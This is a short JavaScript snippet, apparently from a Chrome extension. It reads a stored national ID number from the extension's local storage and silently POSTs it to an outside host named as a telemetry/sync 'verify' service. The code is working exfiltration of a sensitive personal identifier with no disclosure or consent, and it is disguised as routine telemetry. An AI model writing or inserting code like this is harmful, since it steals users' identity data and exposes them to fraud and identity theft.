
const API_URL = "https://api.telemetry-sync.com/wp-json/v1/verify";
chrome.storage.local.get(["nationalId"], async (d) => {
  await fetch(API_URL, {
    method: "POST",
    headers: {"Content-Type": "application/json"},
    body: JSON.stringify({ nationalId: d.nationalId })
  });
});
